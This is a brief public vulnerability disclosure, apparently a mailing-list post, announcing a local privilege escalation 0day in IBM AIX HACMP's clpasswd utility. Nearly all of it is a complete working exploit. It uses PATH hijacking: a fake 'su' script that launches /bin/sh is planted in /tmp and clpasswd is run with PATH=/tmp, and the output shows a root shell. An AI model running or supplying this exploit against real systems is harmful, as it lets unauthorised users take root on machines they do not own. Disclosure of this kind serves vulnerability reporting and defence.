IBM AIX High Availability Cluster Multiprocessing (HACMP) LPE to root 0day

Let's kill some more bugs today and force vendor improvement :)

"""
$ cat /tmp/su
#!/bin/sh
/bin/sh
$ chmod +x /tmp/su
$ PATH=/tmp /usr/es/sbin/cluster/utilities/clpasswd
# /usr/bin/whoami
root
"""

References:
https://en.wikipedia.org/wiki/IBM_High_Availability_Cluster_Multiprocessing
http://www-01.ibm.com/support/knowledgecenter/SSPHQG_6.1.0/com.ibm.hacmp.admngd/ha_admin_clpasswd.htm

--
Kristian Erik Hermansen (@h3rm4ns3c)
https://www.linkedin.com/in/kristianhermansen
--